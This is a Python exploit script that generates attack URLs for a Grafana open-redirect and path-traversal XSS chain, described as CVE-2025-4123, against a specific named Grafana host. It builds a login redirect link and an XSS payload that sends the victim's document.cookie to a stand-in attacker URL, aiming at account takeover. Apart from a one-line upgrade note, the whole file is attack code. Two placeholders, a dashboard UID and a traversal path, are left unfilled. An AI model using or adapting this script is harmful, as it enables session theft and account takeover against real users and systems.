#!/usr/bin/env python3
"""
CVE-2025-4123 URL generator for Grafana < 11.5.4.
Client-side path traversal + open-redirect -> attacker frontend plugin -> ATO.
Auth: None required. User interaction: victim must click link.
Fix: upgrade to 11.5.6+security-01.
"""
import urllib.parse, sys

BASE = "https://grafana.atomicmail.ai"


def craft_redirect(callback_url: str) -> str:
    """Open redirect via org-switch flow (chains with CVE-2025-6197)."""
    return f"{BASE}/login?redirectTo={urllib.parse.quote(callback_url)}"


def craft_xss(js_payload: str) -> str:
    """
    XSS via scripted dashboard path traversal (CVE-2025-4123).
    Replace <uid> with a valid dashboard UID and <traversal-path> with
    the specific path confirmed in PoC for 11.5.x.
    """
    encoded = urllib.parse.quote(js_payload)
    return f"{BASE}/d/<uid>/../.././../<traversal-path>?orgId=1&payload={encoded}"


if __name__ == "__main__":
    cb = sys.argv[1] if len(sys.argv) > 1 else "https://attacker.example/log"
    print("[redirect chain]")
    print(craft_redirect(cb))
    print()
    print("[XSS carrier -- fill in uid + traversal path]")
    print(craft_xss(f"fetch('{cb}?c='+document.cookie)"))
